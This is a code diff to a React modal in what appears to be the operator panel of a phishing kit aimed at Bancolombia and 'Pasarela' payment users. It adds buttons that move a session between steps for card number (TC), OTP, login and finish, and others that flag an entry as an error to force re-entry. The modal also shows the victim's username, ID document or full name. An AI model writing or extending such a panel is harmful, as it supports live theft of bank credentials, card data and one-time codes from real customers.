@@ -4,7 +4,7 @@ import { Badge } from '@/components/ui/badge';
 import { CircleUserRound } from 'lucide-react';
 import DrawerComments from './drawer-comments';
 import { Button } from '@/components/ui/button';
-import { selectColorStatus } from '@/lib/utils';
+import { cn, selectColorStatus } from '@/lib/utils';
 import { Skeleton } from '@/components/ui/skeleton';
 import { createClient } from '@/lib/supabase/client';
 import { Separator } from '@/components/ui/separator';
@@ -43,7 +43,8 @@ const ModalDetail = (props: IProps) => {
   const CURRENT_STEP = CATALOG_BC[props.data?.currentStep?.step ?? 0];
   const user =
     props.data?.processHistory?.at(0)?.data.username ??
-    props.data?.processHistory?.at(0)?.data.document;
+    props.data?.processHistory?.at(0)?.data.document ??
+    props.data?.processHistory?.at(0)?.data.fullName;
   const updateStep = async (step: number, error: boolean, label: string) => {
     await supabase
       .from('panel')
@@ -62,7 +63,15 @@ const ModalDetail = (props: IProps) => {
   };
   const isStateLoading = CURRENT_STEP === 'LOADING';
   const COLOR_SELECTED = selectColorStatus(CURRENT_STEP);
-  console.log(isStateLoading);
+  const firstOriginArePasarela =
+    props?.data?.processHistory?.[0]?.data?.origin?.includes('Pasarela');
+
+  const MAP_BUTTON_SELECTED = firstOriginArePasarela
+    ? (props?.data?.processHistory?.length ?? 0) > 1
+      ? 'pasarela'
+      : 'pasarela_check'
+    : 'bancolombia';
+
   return (
     <Dialog open={Boolean(props.openCard)} onOpenChange={handleClose}>
       <DialogContent className='max-w-2xl overflow-auto border-none rounded-none h-dvh'>
@@ -105,8 +114,10 @@ const ModalDetail = (props: IProps) => {
               </section>
             </div>
 
-            <DialogDescription className='grid grid-cols-4 gap-1'>
-              {BUTTONS_OPTIONS.map((d) => (
+            <DialogDescription
+              className={cn(BUTTONS_MAP_CLASSNAME[MAP_BUTTON_SELECTED])}
+            >
+              {BUTTONS_MAP[MAP_BUTTON_SELECTED].map((d) => (
                 <Button
                   key={d.label}
                   variant={'secondary'}
@@ -244,3 +255,74 @@ const BUTTONS_OPTIONS: TypeButtonOptions[] = [
     },
   },
 ];
+const BUTTONS_OPTIONS_PASARELA: TypeButtonOptions[] = [
+  {
+    label: '💳 TC',
+    option: {
+      error: false,
+      step: CATALOG_BC.TC,
+    },
+  },
+  {
+    label: '📲 OTP',
+    option: {
+      error: false,
+      step: CATALOG_BC.OTP,
+    },
+  },
+  {
+    label: '❌ LG',
+    option: {
+      error: true,
+      step: CATALOG_BC.LOGIN,
+    },
+  },
+  {
+    label: '❌ TC',
+    option: {
+      error: true,
+      step: CATALOG_BC.TC,
+    },
+  },
+  {
+    label: '❌ OTP',
+    option: {
+      error: true,
+      step: CATALOG_BC.OTP,
+    },
+  },
+  {
+    label: '✅ FIN',
+    option: {
+      error: false,
+      step: CATALOG_BC.END,
+    },
+  },
+];
+const BUTTONS_OPTIONS_PASARELA_CHECK: TypeButtonOptions[] = [
+  {
+    label: '❌ TC',
+    option: {
+      error: true,
+      step: CATALOG_BC.TC,
+    },
+  },
+  {
+    label: '🏦 LOGO',
+    option: {
+      error: false,
+      step: CATALOG_BC.LOGIN,
+    },
+  },
+];
+
+const BUTTONS_MAP = {
+  bancolombia: BUTTONS_OPTIONS,
+  pasarela: BUTTONS_OPTIONS_PASARELA,
+  pasarela_check: BUTTONS_OPTIONS_PASARELA_CHECK,
+};
+const BUTTONS_MAP_CLASSNAME = {
+  bancolombia: 'grid grid-cols-4 gap-1',
+  pasarela: 'grid grid-cols-3 gap-1',
+  pasarela_check: 'grid grid-cols-2 gap-1',
+};
